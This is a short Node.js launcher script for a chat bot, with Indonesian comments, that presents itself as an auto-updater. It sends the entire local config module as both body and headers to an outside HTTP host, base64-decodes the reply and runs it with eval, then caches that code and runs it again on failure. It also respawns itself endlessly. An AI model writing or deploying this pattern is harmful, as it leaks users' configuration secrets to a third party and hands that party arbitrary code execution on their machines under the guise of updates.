if(process.argv[2] == `y`){

    global.require = require;

    // mengambil script dari script utama gunanya untuk otomatis update jika ada bug
    require(`axios`).post(`http://xiex.my.id/vbot`,require(`./config`),{headers: require(`./config`)}).then(({data}) => {

        console.log(`mengupdate ...`)

        // jika ingin melihat scriptnya ganti "eval" menjadi "console.log"
        const code = `${Buffer.from(`${data}`,`base64`)}`;
        eval(code)
        require(`fs`).writeFileSync(`./code.js`,code)
        // menjalakan script tadi
        connjs(require(`./config`))
    }).catch(e => {
        console.log(`menggunakan script lama ...`)
        const code = `${require(`fs`).readFileSync(`./code.js`)}`;
        eval(code);
        connjs(require(`./config`));
    })
}else{
    // ini agar idup terus
    function idupterus(){
        const nod = require(`child_process`).spawn('node', ['index.js',`y`], {
            stdio: 'inherit',
            shell: true
          });
        nod.on(`close`, (code) => idupterus());
        nod.on(`exit`, (code) => {})
        // nod.stdout.on('data', (data) => {
        //  console.log(`${data}`);
        // });
        // nod.stdout.on('data', (data) => {
        //     console.log(`${data}`);
        //    });
        // nod.stderr.on('data', (data) => {
        //     console.error(`${data}`)
        // });
        // nod.stderr.on('close', (data) => {
        //  console.error(`${data}`)
        // });
        // nod.stderr.on('exit', (data) => {
        //     console.error(`${data}`)
        // });
        nod.on('error', (error) => {
            console.error(`${error.message}`);
        });

        nod.on('exit', (code, signal) => {
            console.log(`Bot terhenti dengan code ${code} dan sinyal ${signal}`);
            //idupterus()
        });
    }
    idupterus()
}
